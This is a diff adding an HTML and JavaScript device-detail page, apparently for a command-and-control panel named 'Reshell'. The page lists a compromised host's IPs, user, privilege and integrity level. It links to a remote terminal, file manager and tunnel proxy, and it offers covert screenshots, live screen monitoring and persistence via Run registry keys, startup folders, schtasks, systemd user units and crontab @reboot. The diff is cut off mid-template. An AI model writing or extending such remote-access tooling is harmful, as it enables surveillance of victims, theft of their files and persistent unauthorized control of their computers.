@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>设备详情 - Reshell</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/static/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/ruoyi.css">
+    <style>
+        /* 放大预览：遮罩半透明，透出背后页面，增强 lightbox 反差 */
+        body.page-client-detail.modal-open .modal-backdrop.show {
+            background-color: rgba(15, 23, 42, 0.42) !important;
+        }
+        /* 避免 centered flex 把整块内容挤偏；大图从上往下排，滚动区自己撑满 */
+        #screen-preview-modal.modal .modal-dialog.modal-dialog-centered {
+            align-items: flex-start;
+            padding-top: 0.75rem;
+            margin-bottom: 0.75rem;
+        }
+        #screen-preview-modal .modal-content {
+            border-radius: 10px;
+            background: rgba(28, 32, 40, 0.92);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.35);
+            /* 勿用 overflow:hidden：大图 + flex 时子元素易被裁切，表现为「只有左上、右下被盖住」 */
+            overflow: visible !important;
+        }
+        #screen-preview-modal .modal-header-screen {
+            background: linear-gradient(180deg, rgba(52, 58, 70, 0.95) 0%, rgba(35, 39, 47, 0.98) 100%);
+            border-bottom: 1px solid rgba(255,255,255,.08);
+        }
+        /* 放大预览：只负责「完整显示图片」，不裁切、不 object-fit；超出区域用滚动条看全图 */
+        #screen-preview-modal .screen-preview-modal-body {
+            display: block;
+            flex: 1 1 auto;
+            min-height: 0;
+            padding: 8px !important;
+            background: rgba(0, 0, 0, 0.2);
+        }
+        #screen-preview-modal .screen-preview-modal-scroll {
+            max-height: calc(100vh - 120px);
+            overflow: auto;
+            -webkit-overflow-scrolling: touch;
+            text-align: center;
+            line-height: 0;
+        }
+        #screen-preview-modal-img[src]:not([src=""]) {
+            display: inline-block !important;
+            max-width: 100%;
+            width: auto !important;
+            height: auto !important;
+            vertical-align: top;
+            margin: 0;
+            /* 禁止任何 object-fit / max-height，避免与浏览器绘制不一致造成「缺一块」 */
+        }
+        /* 功能区内嵌预览：全宽 + 深色底，避免两侧大白边；高度按视口给足 */
+        .screen-preview-stage {
+            width: 100%;
+            max-width: 100%;
+            background: #0f1115;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-sizing: border-box;
+            padding: 6px;
+            text-align: center;
+            line-height: 0;
+            overflow: auto;
+            max-height: min(72vh, 900px);
+        }
+        .screen-preview-stage--compact {
+            max-height: min(50vh, 560px);
+        }
+        .screen-preview-stage img {
+            max-width: 100%;
+            width: auto;
+            height: auto;
+            display: inline-block;
+            vertical-align: top;
+            cursor: zoom-in;
+        }
+        /* 勿在 HTML 写空 src，避免异常请求；无有效图时不占位 */
+        #screen-preview-modal-img {
+            cursor: default;
+        }
+        #screen-preview-modal-img:not([src]),
+        #screen-preview-modal-img[src=""] {
+            display: none !important;
+        }
+        #screenshot-preview:not([src]),
+        #screenshot-preview[src=""],
+        #monitor-preview:not([src]),
+        #monitor-preview[src=""] {
+            display: none !important;
+        }
+        /* 红色系退出（与全站紫粉渐变区分，更易辨认） */
+        #screen-preview-modal .btn-screen-preview-exit {
+            border: none !important;
+            font-weight: 600;
+            padding: 0.35rem 0.85rem;
+            color: #fff !important;
+            background-image: linear-gradient(135deg, #f43f5e 0%, #dc2626 55%, #b91c1c 100%) !important;
+            box-shadow: 0 2px 10px rgba(220, 38, 38, 0.5);
+        }
+        #screen-preview-modal .btn-screen-preview-exit:hover {
+            filter: brightness(1.06);
+            color: #fff !important;
+        }
+        #screen-preview-modal .btn-screen-preview-exit:focus,
+        #screen-preview-modal .btn-screen-preview-exit:active {
+            color: #fff !important;
+            background-image: linear-gradient(135deg, #f43f5e 0%, #dc2626 55%, #b91c1c 100%) !important;
+            box-shadow: 0 0 0 0.2rem rgba(220, 38, 38, 0.55) !important;
+        }
+    </style>
+</head>
+<body class="page-client-detail">
+<div class="layout-wrapper">
+    <aside class="layout-sidebar">
+        <div class="logo">
+            <span>Reshell</span>
+        </div>
+        <ul class="layout-menu">
+            <li><a href="/dashboard">仪表盘</a></li>
+            <li><a href="/listeners">监听管理</a></li>
+            <li><a href="/clients" class="active">客户端管理</a></li>
+            <li><a href="/payloads">载荷生成</a></li>
+        </ul>
+    </aside>
+
+    <div class="layout-main">
+        <header class="layout-header">
+            <div class="layout-header-title" id="page-title">设备详情</div>
+            <div class="layout-header-actions">
+                <a href="/clients" class="btn btn-outline-secondary btn-sm">返回列表</a>
+                <button class="btn btn-outline-danger btn-sm" onclick="logout()">退出登录</button>
+            </div>
+        </header>
+
+        <main class="layout-content">
+            <div class="breadcrumb-bar">首页 / 客户端管理 / 设备详情</div>
+
+            <div class="row g-3 mb-3">
+                <div class="col-md-6">
+                    <div class="card">
+                        <div class="card-header">
+                            <span>基本信息</span>
+                        </div>
+                        <div class="card-body">
+                            <table class="table table-sm mb-0">
+                                <tr><td width="140">ID</td><td id="info-id">-</td></tr>
+                                <tr><td>状态</td><td id="info-status">-</td></tr>
+                                <tr><td>外网IP</td><td id="info-external-ip">-</td></tr>
+                                <tr><td>归属地</td><td id="info-location">-</td></tr>
+                                <tr><td>内网IP</td><td id="info-internal-ip">-</td></tr>
+                                <tr><td>主机名</td><td id="info-hostname">-</td></tr>
+                                <tr><td>用户名</td><td id="info-username">-</td></tr>
+                                <tr><td>操作系统</td><td id="info-os">-</td></tr>
+                                <tr><td>系统版本</td><td id="info-os-version">-</td></tr>
+                                <tr><td>架构</td><td id="info-arch">-</td></tr>
+                                <tr><td>进程名</td><td id="info-process">-</td></tr>
+                                <tr><td>进程ID</td><td id="info-pid">-</td></tr>
+                                <tr><td>管理员权限</td><td id="info-admin">-</td></tr>
+                                <tr><td>提权运行</td><td id="info-elevated">-</td></tr>
+                                <tr><td>完整性级别</td><td id="info-integrity">-</td></tr>
+                                <tr><td>连接方式</td><td id="info-connect">-</td></tr>
+                                <tr><td>工作目录</td><td id="info-workdir" class="text-break">-</td></tr>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-6">
+                    <div class="card mb-3">
+                        <div class="card-header">
+                            <span>硬件 / 上线信息</span>
+                        </div>
+                        <div class="card-body">
+                            <table class="table table-sm mb-0">
+                                <tr><td width="140">CPU</td><td id="info-cpu">-</td></tr>
+                                <tr><td>逻辑处理器</td><td id="info-logical-cpu">-</td></tr>
+                                <tr><td>GPU</td><td id="info-gpu" class="text-break">-</td></tr>
+                                <tr><td>主分辨率</td><td id="info-screen">-</td></tr>
+                                <tr><td>内存</td><td id="info-memory">-</td></tr>
+                                <tr><td>磁盘</td><td id="info-disk">-</td></tr>
+                                <tr><td>开机自启</td><td id="info-autostart">-</td></tr>
+                                <tr><td>首次上线</td><td id="info-first-online">-</td></tr>
+                                <tr><td>最后上线</td><td id="info-last-online">-</td></tr>
+                                <tr><td>最后心跳</td><td id="info-last-heartbeat">-</td></tr>
+                                <tr><td>心跳值</td><td id="info-heartbeat-value">-</td></tr>
+                            </table>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span>备注</span>
+                        </div>
+                        <div class="card-body remark-card-body">
+                            <div class="remark-input-row d-flex flex-wrap align-items-stretch gap-2">
+                                <input type="text" class="form-control remark-input-control" id="remark-input" placeholder="输入备注...">
+                                <button type="button" class="btn btn-primary flex-shrink-0" onclick="updateRemark()">保存</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card mb-3">
+                <div class="card-header">
+                    <span>功能面板</span>
+                </div>
+                <div class="card-body">
+                    <div class="btn-group mb-3" role="group" aria-label="功能切换">
+                        <button class="btn btn-outline-primary btn-sm" onclick="switchFeature('terminal')">终端操作</button>
+                        <button class="btn btn-outline-secondary btn-sm" onclick="switchFeature('files')">文件管理</button>
+                        <button class="btn btn-outline-warning btn-sm" onclick="switchFeature('tunnel')">隧道代理</button>
+                        <button type="button" id="btn-feature-screenshot" class="btn btn-outline-info btn-sm" onclick="switchFeature('screenshot_only')">屏幕截图</button>
+                        <button type="button" id="btn-feature-monitor" class="btn btn-outline-dark btn-sm" onclick="switchFeature('monitor')">屏幕监控</button>
+                        <button class="btn btn-outline-success btn-sm" onclick="switchFeature('autostart')">开机自启</button>
+                    </div>
+                    <div id="feature-panel" class="border rounded p-3 bg-light small">
+                        请选择上方功能查看详细说明和操作入口。
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+</div>
+
+<!-- 截图 / 监控共用：居中放大预览（非浏览器全屏），参考浮层卡片 -->
+<div class="modal fade" id="screen-preview-modal" tabindex="-1" aria-hidden="true" data-bs-backdrop="true">
+    <div class="modal-dialog modal-dialog-centered modal-lg" style="max-width: min(98vw, 1280px); margin: 0.75rem auto;">
+        <div class="modal-content border-0 shadow-lg">
+            <div class="modal-header modal-header-screen py-2 px-3 align-items-center">
+                <span class="text-white-50 small me-2 user-select-none" style="font-weight: 700; letter-spacing: 3px;">V</span>
+                <h5 class="modal-title text-white mb-0 flex-grow-1 small" id="screen-preview-modal-title">预览</h5>
+                <button type="button" class="btn btn-sm btn-danger btn-screen-preview-exit" data-bs-dismiss="modal">退出</button>
+            </div>
+            <div class="modal-body screen-preview-modal-body">
+                <div class="screen-preview-modal-scroll">
+                    <img id="screen-preview-modal-img" alt="预览">
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="/static/bootstrap.bundle.min.js"></script>
+<script>
+    const clientID = {{.ClientID}};
+    let monitorPollTimer = null;
+    /** 由基本信息里的 os_type 推断，用于隐藏 Windows 专用能力、切换自启选项 */
+    let clientIsLinux = false;
+    let currentFeature = 'terminal';
+    let monitorPreviewObjectUrl = null;
+    let screenshotPreviewObjectUrl = null;
+
+    function logout() {
+        localStorage.removeItem('c2_token');
+        document.cookie = 'c2_token=; Max-Age=0; path=/';
+        window.location.href = '/login';
+    }
+
+    function getToken() {
+        return localStorage.getItem('c2_token') || '';
+    }
+
+    function apiCall(url, options = {}) {
+        return fetch(url, {
+            ...options,
+            headers: {
+                'Authorization': 'Bearer ' + getToken(),
+                'Content-Type': 'application/json',
+                ...(options.headers || {})
+            }
+        });
+    }
+
+    /** 拉取需 JWT 的图片接口（勿用 window.open，新标签页不会带 Bearer） */
+    async function fetchScreenshotBlobUrl() {
+        const r = await fetch('/api/screenshots/latest/' + clientID + '?t=' + Date.now(), {
+            headers: { 'Authorization': 'Bearer ' + getToken() }
+        });
+        if (r.status === 401) {
+            window.location.href = '/login';
+            return null;
+        }
+        if (!r.ok) return null;
+        const blob = await r.blob();
+        return URL.createObjectURL(blob);
+    }
+
+    function openScreenPreviewModal(title, srcEl) {
+        const modalEl = document.getElementById('screen-preview-modal');
+        const modalImg = document.getElementById('screen-preview-modal-img');
+        const titleEl = document.getElementById('screen-preview-modal-title');
+        if (!modalEl || !modalImg || !titleEl) return;
+        if (!srcEl || !srcEl.getAttribute || !srcEl.getAttribute('src')) {
+            alert('暂无画面，请先完成截图或开始监控并等待刷新。');
+            return;
+        }
+        titleEl.textContent = title;
+        modalImg.src = srcEl.src;
+        modalEl.dataset.previewKind = (title && title.indexOf('监控') >= 0) ? 'monitor' : 'screenshot';
+        bootstrap.Modal.getOrCreateInstance(modalEl).show();
+    }
+
+    function openScreenPreviewFromShot() {
+        openScreenPreviewModal('屏幕截图 · 放大查看', document.getElementById('screenshot-preview'));
+    }
+
+    function openScreenPreviewFromMonitor() {
+        openScreenPreviewModal('屏幕监控 · 放大查看', document.getElementById('monitor-preview'));
+    }
+
+    function stopScreenshotPreview() {
+        const modalEl = document.getElementById('screen-preview-modal');
+        if (modalEl && modalEl.classList.contains('show') && modalEl.dataset.previewKind === 'screenshot') {
+            bootstrap.Modal.getInstance(modalEl)?.hide();
+        }
+        if (screenshotPreviewObjectUrl) {
+            URL.revokeObjectURL(screenshotPreviewObjectUrl);
+            screenshotPreviewObjectUrl = null;
+        }
+        const img = document.getElementById('screenshot-preview');
+        if (img) img.removeAttribute('src');
+    }
+
+    function stopMonitorPreview() {
+        const modalEl = document.getElementById('screen-preview-modal');
+        if (modalEl && modalEl.classList.contains('show') && modalEl.dataset.previewKind === 'monitor') {
+            bootstrap.Modal.getInstance(modalEl)?.hide();
+        }
+        if (monitorPollTimer) {
+            clearInterval(monitorPollTimer);
+            monitorPollTimer = null;
+        }
+        if (monitorPreviewObjectUrl) {
+            URL.revokeObjectURL(monitorPreviewObjectUrl);
+            monitorPreviewObjectUrl = null;
+        }
+        const img = document.getElementById('monitor-preview');
+        if (img) img.removeAttribute('src');
+    }
+
+    async function refreshScreenshotPreview() {
+        const img = document.getElementById('screenshot-preview');
+        if (!img) return;
+        const url = await fetchScreenshotBlobUrl();
+        if (!url) return;
+        if (screenshotPreviewObjectUrl) URL.revokeObjectURL(screenshotPreviewObjectUrl);
+        screenshotPreviewObjectUrl = url;
+        img.src = url;
+        const modalEl = document.getElementById('screen-preview-modal');
+        const modalImg = document.getElementById('screen-preview-modal-img');
+        if (modalEl && modalImg && modalEl.classList.contains('show') && modalEl.dataset.previewKind === 'screenshot') {
+            modalImg.src = url;
+        }
+    }
+
+    async function refreshMonitorPreview() {
+        const img = document.getElementById('monitor-preview');
+        if (!img) return;
+        const url = await fetchScreenshotBlobUrl();
+        if (!url) return;
+        if (monitorPreviewObjectUrl) URL.revokeObjectURL(monitorPreviewObjectUrl);
+        monitorPreviewObjectUrl = url;
+        img.src = url;
+        const modalEl = document.getElementById('screen-preview-modal');
+        const modalImg = document.getElementById('screen-preview-modal-img');
+        if (modalEl && modalImg && modalEl.classList.contains('show') && modalEl.dataset.previewKind === 'monitor') {
+            modalImg.src = url;
+        }
+    }
+
+    async function startScreenMonitor() {
+        const interval = parseInt(document.getElementById('monitor-interval').value || '2000', 10);
+        const quality = parseInt(document.getElementById('monitor-quality').value || '50', 10);
+        stopMonitorPreview();
+        const resp = await apiCall('/api/clients/' + clientID + '/monitor/start', {
+            method: 'POST',
+            body: JSON.stringify({ interval: interval, quality: quality })
+        });
+        const ret = await resp.json().catch(() => ({}));
+        if (!resp.ok) {
+            alert(ret.error || '启动监控失败');
+            return;
+        }
+        await refreshMonitorPreview();
+        monitorPollTimer = setInterval(refreshMonitorPreview, Math.max(800, interval));
+        alert('已请求开始屏幕监控，预览将定时刷新（只读）。离开本页前请点击「停止监控」。');
+    }
+
+    async function stopScreenMonitor() {
+        stopMonitorPreview();
+        const resp = await apiCall('/api/clients/' + clientID + '/monitor/stop', { method: 'POST', body: '{}' });
+        const ret = await resp.json().catch(() => ({}));
+        if (!resp.ok) {
+            alert(ret.error || '停止监控失败');
+            return;
+        }
+        alert('已请求停止屏幕监控。');
+    }
+
+    function fmtApiTime(iso) {
+        if (!iso) return '-';
+        try {
+            const d = new Date(iso);
+            if (isNaN(d.getTime())) return String(iso);
+            return d.toLocaleString('zh-CN', { hour12: false });
+        } catch (e) {
+            return String(iso);
+        }
+    }
+
+    function loadClientInfo() {
+        apiCall('/api/clients/' + clientID)
+            .then(r => {
+                if (r.status === 401) {
+                    window.location.href = '/login';
+                    return null;
+                }
+                return r.json();
+            })
+            .then(data => {
+                if (!data) return;
+                const id = data.id != null ? data.id : data.ID;
+                const status = data.status != null ? data.status : data.Status;
+                const extIp = data.external_ip != null ? data.external_ip : data.ExternalIP;
+                const extLoc = data.external_location != null ? data.external_location : data.ExternalLocation;
+                const intIp = data.internal_ip != null ? data.internal_ip : data.InternalIP;
+                const host = data.hostname != null ? data.hostname : data.Hostname;
+                const user = data.username != null ? data.username : data.Username;
+                const osType = data.os_type != null ? data.os_type : data.OSType;
+                const osVer = data.os_version != null ? data.os_version : data.OSVersion;
+                const arch = data.architecture != null ? data.architecture : data.Architecture;
+                const procName = data.process_name != null ? data.process_name : data.ProcessName;
+                const pid = data.process_id != null ? data.process_id : data.ProcessID;
+                const isAdm = data.is_admin != null ? data.is_admin : data.IsAdmin;
+                const isEl = data.is_elevated != null ? data.is_elevated : data.IsElevated;
+                const integ = data.integrity != null ? data.integrity : data.Integrity;
+                const cpu = data.cpu_info != null ? data.cpu_info : data.CPUInfo;
+                const gpu = data.gpu_info != null ? data.gpu_info : data.GpuInfo;
+                const screenRes = data.screen_resolution != null ? data.screen_resolution : data.ScreenResolution;
+                const logCpu = data.logical_processors != null ? data.logical_processors : data.LogicalProcessors;
+                const mem = data.memory_size != null ? data.memory_size : data.MemorySize;
+                const disk = data.disk_size != null ? data.disk_size : data.DiskSize;
+                const autoSt = data.auto_start != null ? data.auto_start : data.AutoStart;
+                const autoTy = data.auto_start_type != null ? data.auto_start_type : data.AutoStartType;
+                const hb = data.heartbeat_value != null ? data.heartbeat_value : data.HeartbeatValue;
+                const remark = data.remark != null ? data.remark : data.Remark;
+                const conn = data.connect_method != null ? data.connect_method : data.ConnectMethod;
+                const wd = data.working_directory != null ? data.working_directory : data.WorkingDirectory;
+
+                document.getElementById('info-id').textContent = id != null ? id : '-';
+                document.getElementById('info-status').innerHTML = status === 'online'
+                    ? '<span class="badge badge-online">在线</span>'
+                    : '<span class="badge badge-offline">离线</span>';
+                document.getElementById('info-external-ip').textContent = extIp || '-';
+                document.getElementById('info-location').textContent = extLoc || '-';
+                document.getElementById('info-internal-ip').textContent = intIp || '-';
+                document.getElementById('info-hostname').textContent = host || '-';
+                document.getElementById('info-username').textContent = user || '-';
+                (function () {
+                    const raw = osType || '';
+                    const low = String(raw).toLowerCase();
+                    let b = '';
+                    if (low.indexOf('linux') >= 0) b = '<span class="badge bg-dark me-1">Linux</span>';
+                    else if (low.indexOf('windows') >= 0) b = '<span class="badge bg-primary me-1">Windows</span>';
+                    document.getElementById('info-os').innerHTML = b + (raw ? String(raw).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;') : '-');
+                })();
+                document.getElementById('info-os-version').textContent = osVer || '-';
+                document.getElementById('info-arch').textContent = arch || '-';
+                document.getElementById('info-process').textContent = procName || '-';
+                document.getElementById('info-pid').textContent = (pid !== undefined && pid !== null && pid !== '') ? pid : '-';
+                document.getElementById('info-admin').textContent = isAdm ? '是' : '否';
+                document.getElementById('info-elevated').textContent = isEl ? '是' : '否';
+                document.getElementById('info-integrity').textContent = integ || '-';
+                document.getElementById('info-connect').textContent = conn || '-';
+                document.getElementById('info-workdir').textContent = wd || '-';
+                document.getElementById('info-cpu').textContent = cpu || '-';
+                document.getElementById('info-logical-cpu').textContent = (logCpu !== undefined && logCpu !== null && logCpu !== '' && Number(logCpu) > 0) ? String(logCpu) : '-';
+                document.getElementById('info-gpu').textContent = gpu || '-';
+                document.getElementById('info-screen').textContent = screenRes || '-';
+                document.getElementById('info-memory').textContent = (mem !== undefined && mem !== null && mem !== '' && Number(mem) > 0) ? mem + ' MB' : (mem === 0 ? '0 MB' : '-');
+                document.getElementById('info-disk').textContent = (disk !== undefined && disk !== null && disk !== '' && Number(disk) > 0) ? disk + ' GB' : (disk === 0 ? '0 GB' : '-');
+                document.getElementById('info-autostart').textContent = autoSt ? (autoTy || '已设置') : '未设置';
+                document.getElementById('info-first-online').textContent = fmtApiTime(data.first_online_at || data.FirstOnlineAt);
+                document.getElementById('info-last-online').textContent = fmtApiTime(data.last_online_at || data.LastOnlineAt);
+                document.getElementById('info-last-heartbeat').textContent = fmtApiTime(data.last_heartbeat_at || data.LastHeartbeatAt);
+                document.getElementById('info-heartbeat-value').textContent = hb !== undefined && hb !== null ? hb : '-';
+                document.getElementById('remark-input').value = remark || '';
+                document.getElementById('page-title').textContent = host || '设备详情';
+                applyClientPlatformUI(osType);
+            });
+    }
+
+    function applyClientPlatformUI(osType) {
+        const low = String(osType || '').toLowerCase();
+        clientIsLinux = low.indexOf('linux') >= 0;
+        const btnShot = document.getElementById('btn-feature-screenshot');
+        const btnMon = document.getElementById('btn-feature-monitor');
+        if (btnShot) btnShot.style.display = clientIsLinux ? 'none' : '';
+        if (btnMon) btnMon.style.display = clientIsLinux ? 'none' : '';
+        if (clientIsLinux && (currentFeature === 'screenshot_only' || currentFeature === 'monitor')) {
+            switchFeature('terminal');
+        }
+    }
+
+    function autostartOptionsHTML() {
+        if (clientIsLinux) {
+            return `
+                        <select class="form-select form-select-sm" id="autostart-type" style="max-width: 420px;">
+                            <option value="systemd_user" selected>systemd --user 单元（推荐，登录会话可用；无会话可试 crontab）</option>
+                            <option value="linux_xdg">XDG 自动启动（~/.config/autostart，需图形桌面登录）</option>
+                            <option value="linux_crontab">crontab @reboot（当前用户，适合 SSH/无桌面）</option>
+                        </select>`;
+        }
+        return `
+                        <select class="form-select form-select-sm" id="autostart-type" style="max-width: 340px;">
+                            <option value="registry">注册表 HKCU\\…\\Run（当前用户）</option>
+                            <option value="registry_hklm">注册表 HKLM\\…\\Run（常需管理员）</option>
+                            <option value="startup_folder">启动文件夹·当前用户（快捷方式）</option>
+                            <option value="startup_folder_all_users">启动文件夹·所有用户（常需管理员）</option>
+                            <option value="scheduled_task">计划任务 schtasks（常需管理员）</option>
+                        </select>`;
+    }
+
+    function updateRemark() {
+        const remark = document.getElementById('remark-input').value;
+        apiCall('/api/clients/' + clientID, {
+            method: 'PATCH',
+            body: JSON.stringify({ remark: remark })
+        }).then(() => {
+            alert('备注已更新');
+        });
+    }
+
+    async function pollCommandResultAsync(cmdId, maxAttempts = 30, intervalMs = 1000) {
+        let attempts = 0;
+        while (attempts < maxAttempts) {
+            attempts++;
+            try {
+                const r = await apiCall('/api/commands/' + cmdId + '/result');
+                const data = await r.json();
+                if (data && data.status === 'completed') return data;
+                if (data && data.status === 'failed') throw new Error(data.result || '命令失败');
+            } catch (e) {
+                if (attempts >= maxAttempts) throw e;
+            }
+            await new Promise(resolve => setTimeout(resolve, intervalMs));
+        }
+        throw new Error('命令执行超时');
+    }
+
+    /** 等到 completed 或 failed（用于需要展示失败详情的命令，如自启；计划任务可能较慢） */
+    async function pollCommandResultTerminal(cmdId, maxAttempts = 200, intervalMs = 500) {
+        let attempts = 0;
+        let lastStatus = '';
+        while (attempts < maxAttempts) {
+            attempts++;
+            const r = await apiCall('/api/commands/' + cmdId + '/result');
+            const data = await r.json();
+            if (data && data.status && data.status !== lastStatus) {
+                lastStatus = data.status;
+                console.warn('[autostart-poll]', cmdId, 'status=', lastStatus);
+            }
+            if (data && (data.status === 'completed' || data.status === 'failed')) {
+                return data;
+            }
+            if (attempts % 30 === 0) {
+                console.warn('[autostart-poll] 仍在等待', cmdId, 'last_status=', lastStatus || (data && data.status) || '?',
+                    '（若一直 running：查服务端是否收到 [autostart-trace] command_response 日志）');
+            }
+            await new Promise(resolve => setTimeout(resolve, intervalMs));
+        }
+        throw new Error('命令执行超时（约 ' + (maxAttempts * intervalMs / 1000) + 's）：多为 Agent 未回 command_response 或 schtasks 曾长时间阻塞，请重编译客户端并看服务端日志）');
+    }
+
+    function setAutostartReport(data) {
+        const el = document.getElementById('autostart-report');
+        if (!el) return;
+        if (!data) {
+            el.textContent = '';
+            return;
+        }
+        const st = data.status || '-';
+        const ok = st === 'completed';
+        el.textContent = '状态: ' + st + (ok ? '（平台判定成功）' : '（平台判定失败或部分失败，请看正文）') + '\n\n' + (data.result || '(无回显正文)');
+    }
+
+    async function takeScreenshot() {
+        const quality = parseInt(document.getElementById('screenshot-quality').value || '70', 10);
+        const resp = await apiCall('/api/clients/' + clientID + '/screenshot', {
+            method: 'POST',
+            body: JSON.stringify({ format: 'png', quality: quality })
+        });
+        const ret = await resp.json();
+        if (!ret || !ret.command_id) {
+            alert('截图命令下发失败');
+            return;
+        }
+        try {
+            await pollCommandResultAsync(ret.command_id, 45, 1000);
+            await refreshScreenshotPreview();
+            alert('截图成功，可点击预览图或「放大查看」。');
+        } catch (e) {
+            alert('截图失败: ' + (e && e.message ? e.message : '未知错误'));
+        }
+    }
+
+    async function applyAutostart() {
+        const sel = document.getElementById('autostart-type');
+        const fallback = clientIsLinux ? 'systemd_user' : 'registry';
+        const type = sel ? sel.value : fallback;
+        setAutostartReport(null);
+        try {
+            const r = await apiCall('/api/clients/' + clientID + '/autostart', {
+                method: 'POST',
+                body: JSON.stringify({ type: type })
+            });
+            if (r.status === 401) {
+                window.location.href = '/login';
+                return;
+            }
+            const j = await r.json();
+            if (!r.ok) throw new Error(j.error || '请求失败');
+            if (!j.command_id) throw new Error('无 command_id');
+            const data = await pollCommandResultTerminal(j.command_id);
+            setAutostartReport(data);
+            loadClientInfo();
+        } catch (e) {
+            const el = document.getElementById('autostart-report');
+            if (el) el.textContent = '错误: ' + (e.message || e);
+            alert('自启: ' + (e.message || e));
+        }
+    }
+
+    async function removeAutoStart() {
+        setAutostartReport(null);
+        try {
+            const r = await apiCall('/api/clients/' + clientID + '/autostart', { method: 'DELETE' });
+            if (r.status === 401) {
+                window.location.href = '/login';
+                return;
+            }
+            const j = await r.json();
+            if (!r.ok) throw new Error(j.error || '请求失败');
+            if (!j.command_id) throw new Error('无 command_id');
+            const data = await pollCommandResultTerminal(j.command_id);
+            setAutostartReport(data);
+            loadClientInfo();
+        } catch (e) {
+            const el = document.getElementById('autostart-report');
+            if (el) el.textContent = '错误: ' + (e.message || e);
+            alert('移除自启: ' + (e.message || e));
+        }
+    }
+
+    // 功能区切换：根据类型更新 feature-panel 内容
+    function switchFeature(type) {
+        currentFeature = type;
+        const panel = document.getElementById('feature-panel');
+        if (!panel) return;
+        if (type !== 'monitor') {
+            stopMonitorPreview();
+            apiCall('/api/clients/' + clientID + '/monitor/stop', { method: 'POST', body: '{}' }).catch(() => {});
+        }
+        if (type !== 'screenshot_only') {
+            stopScreenshotPreview();
+        }
+        let html = '';
+        const baseInfo = `<p class="mb-2 text-muted">当前客户端 ID: ${clientID}</p>`;
+        switch (type) {
+            case 'terminal':
+                html = baseInfo + `
+                    <p>打开交互终端，对当前客户端执行命令。</p>
+                    <a href="/terminal/${clientID}" class="btn btn-sm btn-outline-primary">进入终端</a>
+                    <p class="mt-2 mb-0 text-muted small">提示：终端仅在客户端在线时可用。</p>
+                `;
+                break;
+            case 'files':
+                html = baseInfo + `
+                    <p>通过文件管理界面浏览、上传、下载和删除客户端文件。</p>
+                    <a href="/files/${clientID}" class="btn btn-sm btn-outline-secondary">进入文件管理</a>
+                    <p class="mt-2 mb-0 text-muted small">提示：大文件下载可能耗时较长，请耐心等待。</p>
+                `;
+                break;
+            case 'tunnel':
+                html = baseInfo + `
+                    <p>创建隧道代理，通过客户端转发本地/远程端口。</p>
+                    <a href="/tunnel/${clientID}" class="btn btn-sm btn-outline-warning">管理隧道代理</a>
+                    <p class="mt-2 mb-0 text-muted small">提示：隧道仅在客户端在线时有效。</p>
+                `;
+                break;
+            case 'screenshot_only':
+                html = baseInfo + `
+                    <p class="mb-2">单次截图：下发命令后等待完成，再用当前登录 Token 拉取最新图（避免无鉴权 URL）。</p>
+                    <div class="d-flex flex-wrap align-items-center gap-2 mb-2">
+                        <label class="form-label mb-0">清晰度</label>
+                        <select class="form-select form-select-sm" id="screenshot-quality" style="width: 110px;">
+                            <option value="40">低</option>
+                            <option value="70" selected>中</option>
+                            <option value="95">高</option>
+                        </select>
+                        <button type="button" class="btn btn-sm btn-outline-info" onclick="takeScreenshot()">下发截图</button>
+                    </div>
+                    <div class="w-100">
+                        <div class="screen-preview-stage screen-preview-stage--compact text-center">
+                            <img id="screenshot-preview" alt="截图预览" class="rounded" title="点击放大查看" onclick="openScreenPreviewFromShot()">
+                        </div>
+                        <button type="button" class="btn btn-sm btn-outline-primary mt-2" onclick="openScreenPreviewFromShot()">放大查看</button>
+                    </div>
+                    <p class="mt-2 mb-0 text-muted small">提示：截图与「屏幕监控」为独立功能；监控请在「屏幕监控」中开启。</p>
+                `;
+                break;
+            case 'monitor':
+                html = baseInfo + `
+                    <p class="mb-2 text-muted small">向客户端请求定时截屏并上报，本页轮询展示最新一帧（只读）。离开本页或切换功能前请点击「停止监控」。</p>
+                    <div class="d-flex flex-wrap align-items-center gap-2 mb-2">
+                        <label class="form-label mb-0">间隔(ms)</label>
+                        <input type="number" class="form-control form-control-sm" id="monitor-interval" value="2000" min="500" step="100" style="width: 100px;">
+                        <label class="form-label mb-0">质量</label>
+                        <select class="form-select form-select-sm" id="monitor-quality" style="width: 90px;">
+                            <option value="40">低</option>
+                            <option value="50" selected>中</option>
+                            <option value="70">高</option>
+                        </select>
+                        <button type="button" class="btn btn-sm btn-outline-success" onclick="startScreenMonitor()">开始监控</button>
+                        <button type="button" class="btn btn-sm btn-outline-danger" onclick="stopScreenMonitor()">停止监控</button>
+                    </div>
+                    <div class="w-100">
+                        <div class="screen-preview-stage text-center">
+                            <img id="monitor-preview" alt="监控预览" class="rounded" title="点击放大查看" onclick="openScreenPreviewFromMonitor()">
+                        </div>
+                        <button type="button" class="btn btn-sm btn-outline-primary mt-2" onclick="openScreenPreviewFromMonitor()">放大查看</button>
+                    </div>
+                `;
+                break;
+            case 'autostart':
+                html = baseInfo + `
+                    <p class="mb-2">选择一种方式后点「设置自启」，下方会轮询<strong>客户端回显</strong>（成功/失败及原因）。</p>
+                    ` + (clientIsLinux
+                        ? `<p class="mb-2 text-muted small">Linux：无注册表；推荐 systemd 用户服务。纯 SSH/无图形会话时若 systemctl --user 失败，请用 <strong>crontab @reboot</strong>，或执行 <code>loginctl enable-linger $USER</code> 后重试 systemd。</p>`
+                        : '') + `
+                    <div class="d-flex flex-wrap align-items-center gap-2 mb-2">
+                        <label class="form-label mb-0">方式</label>
+                        ` + autostartOptionsHTML() + `
+                        <button type="button" class="btn btn-sm btn-outline-success" onclick="applyAutostart()">设置自启</button>
+                        <button type="button" class="btn btn-sm btn-outline-danger" onclick="removeAutoStart()">移除自启</button>
+                    </div>
+                    <label class="form-label small text-muted">执行回显（命令完成后自动更新）</label>
